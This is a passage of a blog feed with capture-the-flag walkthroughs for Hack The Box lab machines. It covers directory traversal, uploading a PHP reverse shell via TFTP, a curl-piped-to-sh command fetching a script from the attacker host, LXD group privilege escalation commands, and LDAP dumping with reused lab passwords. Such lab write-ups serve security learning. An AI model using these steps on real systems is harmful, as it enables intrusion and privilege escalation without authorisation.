</code></pre><p>While it&apos;s running, the Hashcat will prompt you like below; then press <code>s</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-190.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="648" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-190.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-190.png 1000w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-65.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="500" height="575"></figure><p>After it succeeded, you will see the cracked password and it is <code><strong>password#1</strong></code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-191.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="717" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-191.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-191.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Then we can use this password to <code>su root</code> or you can use SSH like this.&#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-192.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="1000" height="690" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-192.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-192.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We got root flag.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-193.png" class="kg-image" alt="Guard Walkthrough" loading="lazy" width="854" height="724" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-193.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-193.png 854w" sizes="(min-width: 720px) 720px"></figure><p>Now we have only one box left on the starting point path. </p><p>So... I&#x2019;ll see you in the next box! <strong><a href="https://h4rithd.com/blog/starting-point-htb-base-walkthrough/index.html">Base</a></strong> &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Included Walkthrough]]></title><description><![CDATA[After the Pathfinder Walkthrough, Here I'm with Included, so... let's hack and grab the flags.

]]></description><link>https://h4rithd.com/blog/starting-point-htb-included-walkthrough/</link><guid isPermaLink="false">60b6660fa8ce8209ffb55e1c</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Included Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Tue, 25 May 2021 16:53:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/IncludedBG.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/IncludedBG.jpg" alt="Included Walkthrough"><p>After the Pathfinder Walkthrough, Here I&apos;m with Included, so... let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>very easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-included-walkthrough/index.html">Pathfinder </a>machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, just click on &quot;<strong>Join Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-153.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1347" height="734" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-153.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-153.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-153.png 1347w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine.<strong> &#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaUNZILxtxwZrMSnVEI%2F-MaUOwCey-fZCBhjBLaj%2Fimage.png?alt=media&amp;token=c796c3a0-8a2b-4c2e-b2e1-e2adfa41f69f" class="kg-image" alt="Included Walkthrough" loading="lazy"></figure><p><br>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-154.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1000" height="351" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-154.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-154.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=63</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Linux</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong>01. Enumeration First &#x2026;</strong></h2><h3 id="011-fast-ports-scan"><strong>01.1 Fast ports scan</strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.55</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-155.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1000" height="623" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-155.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-155.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>So again we have only port 80 open.</p><h3 id="012-run-nmap-scripting-engine"><strong>01.2 Run Nmap Scripting Engine</strong></h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore, we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 80 10.10.10.55 </code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-156.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1000" height="467" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-156.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-156.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We have only port 80 open here. Now you know what is next..</p><h3 id="013-discover-more-on-port-80"><strong>01.3 Discover more on port 80</strong></h3><p>Let&apos;s open web browser and check what is inside the port 80.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-157.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1322" height="891" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-157.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-157.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-157.png 1322w" sizes="(min-width: 720px) 720px"></figure><p>By looking at the URL, we can assume that we have some Directory Traversal vulnerability here. So let&apos;s check it.</p><blockquote><em>Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server. </em><a href="https://portswigger.net/web-security/file-path-traversal" rel="noopener noreferrer"><em>source</em></a></blockquote><p>We can easily check this using burp suite repeater tab. Let&apos;s power up burp suite and navigate to the site again.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-158.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1000" height="505" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-158.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-158.png 1000w" sizes="(min-width: 720px) 720px"></figure><p><br>As you can see we have <strong>Directory Traversal</strong> vulnerability. If we can upload any reverse shell script, we can call that file and get success by using this vulnerability. But do how we upload the reverse shell file? I tried so hard to find a way but I could not. &#x1F625;&#x1F625;</p><p>Then I looked deeply at all the users which were available in the <code>/etc/passwd</code> using directory traversal vulnerability. You know what I found there? There is a user also in &#xA0;<a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol" rel="noopener noreferrer">TFTP </a>. Wait what.. How did we miss that port? &#x1F914;&#x1F914; Oh shoot! It&apos;s running on UDP port 69.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-159.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="499" height="497"></figure><p>Let&apos;s run Nmap again and check whether that port is alive.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-160.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1000" height="356" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-160.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-160.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>Yay!! It&apos;s alive. Let&apos;s try to connect to that service.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-161.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1000" height="535" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-161.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-161.png 1000w" sizes="(min-width: 720px) 720px"></figure><p>We can connect to that service and also we can upload any file using that service. Now we have an idea &#xA0;&#x1F4A1;&#x1F4A1;. But how do I know the exact path where that file was stored in?</p><p>Again we can check that <code>/etc/passwd</code> file to get an idea about the home directory.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-162.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="547" height="114"></figure><p><br>Fine! Now we know where my file will be located after I uploaded it to the TFTP.&#x1F60B;&#x1F60B;</p><hr><h3 id="02-foothold"><strong>02. Foothold</strong></h3><p>First we need to create <strong>PHP Reverse Shell</strong>. We can simply copy it from our kali webshell directory or using <a href="https://www.revshells.com/" rel="noopener noreferrer">this </a>site.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-163.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1536" height="858" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-163.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-163.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-163.png 1536w" sizes="(min-width: 720px) 720px"></figure><p>After editing the above sections you can copy that part of the code and paste it into the file.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaUjnDowVFvSXijt2ic%2F-MaUsba65hDsvdmvO2He%2Fimage.png?alt=media&amp;token=5a71ee46-8d6c-4bb5-ad2c-52b500cd5241" class="kg-image" alt="Included Walkthrough" loading="lazy"></figure><p>Now, let&apos;s use TFTP and upload that file. Use <code>put</code> command to upload the file.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-164.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1334" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-164.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-164.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-164.png 1334w" sizes="(min-width: 720px) 720px"></figure><p>Then let&apos;s fire up netcat listener and check that file using Directory Traversal vulnerability. The path to file location will be <code>/var/lib/tftpboot/filename.php</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-165.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1402" height="496" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-165.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-165.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-165.png 1402w" sizes="(min-width: 720px) 720px"></figure><p><br>We successfully landed a reverse shell as <code>www-data</code>, it&apos;s good to spawn a TTY shell.</p><pre><code class="language-bash">python3 -c &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;</code></pre><p>If you look around the <code>/home</code> directory, we have a user called <strong>mike</strong>. Since all these boxes are connected together, [I mean, passwords are reused] we can check using the passwords we found on <a href="https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/index.html">Pathfinder </a>walkthrough. Let&apos;s try to <code>su mike</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-166.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="675" height="195" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-166.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-166.png 675w"></figure><p>Yes! It was successful and we can grab the user flag using <code>Sheffield19</code> Password. Now it&apos;s time to root flag. &#x1F60E;&#x1F60E;</p><hr><h2 id="03-privilege-escalation"><strong>03. Privilege Escalation</strong></h2><p>When it comes to privilege escalations, we can manually check one by one or we can simply run any automation script to do the searching for us. Since this box is the Linux box we can use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" rel="noopener noreferrer">LinPEAS </a>.</p><p>First we need to copy that script to our machine.</p><pre><code class="language-bash">wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh</code></pre><p>Then we can run python demon server to host that file from our end.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-167.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="1334" height="332" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-167.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-167.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-167.png 1334w" sizes="(min-width: 720px) 720px"></figure><p>Now we can use <code>wget</code>command to download that file to the <strong>Included</strong> box. But here, I&apos;m not going to download it and run. Instead of that I use curl command to run that file directly.</p><pre><code class="language-bash">curl http://&lt;YourIP&gt;:8000/inpeas.sh | sh </code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-168.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="815" height="389" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-168.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-168.png 815w" sizes="(min-width: 720px) 720px"></figure><p>We can identify interesting stuff by looking at the output file. &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaXAi1kPj5ASB1oAZ2U%2F-MaXL6cM8X3vxKek6B3r%2Fimage.png?alt=media&amp;token=0afb27d4-728c-49d3-ab73-b02b8ca80ced" class="kg-image" alt="Included Walkthrough" loading="lazy"></figure><p>As you can see the mike user is in the LXD group. LXD group is a high-privileged group in Linux system.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaX71gS93IHNUagPjAw%2F-MaX8xZAq6POH7Rlc8uf%2Fimage.png?alt=media&amp;token=efa22c3b-d3fd-4097-a97c-b7821528604a" class="kg-image" alt="Included Walkthrough" loading="lazy"></figure><p>Here I found <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" rel="noopener noreferrer">lxd/lxc Group - Privilege escalation</a> script from <a href="https://book.hacktricks.xyz/" rel="noopener noreferrer">hacktricks</a>. And I&apos;m going to go through the <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2" rel="noopener noreferrer">second method</a> in that article.</p><p>First, Try to clone the following repository to your host and build an <a href="https://hub.docker.com/_/alpine" rel="noopener noreferrer">alpine image</a>.</p><pre><code class="language-bash">git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine</code></pre><p>After you executed the build-alpine file, a <code>tar.gx</code> file should be created. File name will be different from my one.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-169.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="807" height="250" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-169.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-169.png 807w" sizes="(min-width: 720px) 720px"></figure><p>Now we can upload it into the server by using python demon web server and download it through <code>wget</code>.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-170.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="937" height="405" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-170.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-170.png 937w" sizes="(min-width: 720px) 720px"></figure><p>Now follow the article again. The following command will import the image and create privileged container with it.</p><pre><code class="language-bash">lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true</code></pre><p>Next we need to mount the <code>/root</code> into the image.</p><pre><code class="language-bash">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</code></pre><p>Now Let&apos;s interact with the container.</p><pre><code class="language-bash">lxc start mycontainer 
lxc exec mycontainer /bin/sh</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-171.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="877" height="393" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-171.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-171.png 877w" sizes="(min-width: 720px) 720px"></figure><p><br>As you can see, we have landed on to the root shell. Now we can grab the root.txt file. It&apos;s located at <code>/mnt/root/root/</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-172.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="377" height="166"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-173.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="872" height="733" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-173.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-173.png 872w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation"><strong>04. Post Exploitation</strong></h3><p>As you can see there is a <code>login.sql</code> file in the <code>/mnt/root/root</code> directory. Let&apos;s open it.</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-174.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="783" height="271" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-174.png 600w, https://h4rithd.com/blog/content/images/2021/06/image-174.png 783w" sizes="(min-width: 720px) 720px"></figure><p></p><p>And it reveals credentials. <code>Daniel : &gt;SNDv*2wzLWf</code></p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-175.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="555" height="152"></figure><p></p><p><br>Okay... I&#x2019;ll see you on the next box! <strong><a href="https://h4rithd.com/blog/starting-point-htb-markup-walkthrough/index.html">Markup</a></strong> &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-176.png" class="kg-image" alt="Included Walkthrough" loading="lazy" width="480" height="308"></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Pathfinder Walkthrough]]></title><description><![CDATA[After the Shield Walkthrough, Here I'm with Pathfinder box and this is the last box you can play ....]]></description><link>https://h4rithd.com/blog/starting-point-htb-pathfinder-walkthrough/</link><guid isPermaLink="false">60b664eda8ce8209ffb55de6</guid><category><![CDATA[Starting Point Walkthrough]]></category><category><![CDATA[Pathfinder Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Harith Dilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Fri, 07 May 2021 16:48:00 GMT</pubDate><media:content url="https://h4rithd.com/blog/content/images/2021/06/PathfinderBG-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://h4rithd.com/blog/content/images/2021/06/PathfinderBG-1.jpg" alt="Pathfinder Walkthrough"><p>After the Shield Walkthrough, Here I&apos;m with Pathfinder box and this is the last box you can play if you are a free member on HTB platform. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 machines rated as &quot;<strong>very easy</strong>&quot; and should be <strong>rooted in a sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-shield-walkthrough/index.html">Shield </a>machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong><em>Disclaimers: </em></strong><em>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</em></blockquote><!--kg-card-begin: html--><script src="https://apps.elfsight.com/p/platform.js" defer></script>
<div class="elfsight-app-a4de7430-6c0c-44b8-aada-9b9ac759e396"></div><!--kg-card-end: html--><hr><h2 id="00-start-machine-%E2%80%A6"><strong>00. Start Machine &#x2026;</strong></h2><p>To start the machine, Just click on &quot;<strong>Join Machine</strong>&quot;.</p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaEUtVo9_WyUvRwmCwd%2F-MaEVeG5FnToZfGM0SkP%2Fimage.png?alt=media&amp;token=80527a75-c0ba-4fad-b31f-caed1e2e416c" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>Then you can see the <strong>IP </strong>address for that machine. <strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaEUtVo9_WyUvRwmCwd%2F-MaEVp2aY2oIGboXm46j%2Fimage.png?alt=media&amp;token=653c86c8-adfe-4e17-8adf-9f6309e6d777" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"></figure><p>Before going to enumeration steps we can simply ping to the IP address and check whether &#xA0;the VPN is connected and the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests when passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-66.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1522" height="554" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-66.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-66.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-66.png 1522w" sizes="(min-width: 720px) 720px"></figure><p>As a ping result, it&apos;s <code>TTL=127</code>. There is only one route between machine and us (VPN). So definitely it will be a <code>Windows</code> machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6"><strong>01. Enumeration First &#x2026;</strong></h2><h3 id="011-fast-ports-scan"><strong>01.1 Fast ports scan</strong></h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.30</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-67.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1864" height="2026" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-67.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-67.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-67.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-67.png 1864w" sizes="(min-width: 720px) 720px"></figure><p>This is why I recommend to scan all the ports. Here you can see there are so many ports open and by looking at the open ports (<code>ldap,kpasswd5 &amp; kerberos</code>) we can definitely say that this machine is an<strong> Active Directory </strong>machine. We haven&apos;t touched that area before. Sharp your Active Directory enumeration skills, it will worth if you are willing to try Red Team activities.</p><blockquote><em>Active Directory is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management. [ </em><a href="https://en.wikipedia.org/wiki/Active_Directory" rel="noopener noreferrer"><em>Wikipedia</em></a><em>]</em></blockquote><h3 id="012-run-nmap-scripting-engine"><strong>01.2 Run Nmap Scripting Engine</strong></h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 49667,49720,49676,49677,593,139,3269,389,9389,135,3268,49664,464,47001,636,49700,49665,49666,49672,5985,445,53,49683,88 10.10.10.30</code></pre><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-68.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="2000" height="1553" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-68.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-68.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-68.png 1600w, https://h4rithd.com/blog/content/images/size/w2400/2021/06/image-68.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>As it is an Active Directory machine, our enumeration steps will be different. <strong>ldap Enumeration</strong> is pretty cool if you use <a href="https://github.com/BloodHoundAD/BloodHound" rel="noopener noreferrer">BloodHound</a> &#xA0;because it gives us graphical information. But it&apos;s already done in official writeup. So let&apos;s begin with my way. &#x1F60E;&#x1F60E;</p><h3 id="013-discover-more-on-domain"><strong>01.3 Discover more on domain</strong></h3><p>Nmap tells us the domain (<code>Domain: MEGACORP</code>) we are in. And don&apos;t forget we had some credentials from <a href="https://h4rithd.com/blog/starting-point-htb-shield-walkthrough/index.html">Shield </a>machine. <code>sandra:Password1234!</code> First we can tryout with <a href="https://github.com/dirkjanm/ldapdomaindump" rel="noopener noreferrer"><code>ldapdomaindump</code></a> tool. Let&apos;s start.</p><pre><code class="language-bash">ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30 --no-json --no-grep  </code></pre><pre><code class="language-bash">-u    : DOMAIN\username for authentication, leave empty for anonymous authentication
-p    : Password or LM:NTLM hash, will prompt if not specified
-o    : Directory in which the dump will be saved (default: current)
--no-json    : Disable JSON output
--no-grep    : Disable Greppable output </code></pre><p>Here is the output, &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-69.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1786" height="478" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-69.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-69.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-69.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-69.png 1786w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-70.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1932" height="370" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-70.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-70.png 1000w, https://h4rithd.com/blog/content/images/size/w1600/2021/06/image-70.png 1600w, https://h4rithd.com/blog/content/images/2021/06/image-70.png 1932w" sizes="(min-width: 720px) 720px"></figure><p>As you can see there are a lot of <code>HTML</code> files here. Among them, first I choose <code>domain_users.html</code> You can view through it from the browser. But instead of that, I will use <a href="https://pypi.org/project/html2text/" rel="noopener noreferrer"><code>html2text</code> </a>tool. You can simply install it by typing <code>sudo apt-get install html2text</code> . However the result will be like this. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="https://h4rithd.com/blog/content/images/2021/06/image-71.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1166" height="514" srcset="https://h4rithd.com/blog/content/images/size/w600/2021/06/image-71.png 600w, https://h4rithd.com/blog/content/images/size/w1000/2021/06/image-71.png 1000w, https://h4rithd.com/blog/content/images/2021/06/image-71.png 1166w" sizes="(min-width: 720px) 720px"></figure><p>There are 5 accounts here. <code>Guest, Administrator</code> and <code>krbtgt</code>accounts are the default accounts. 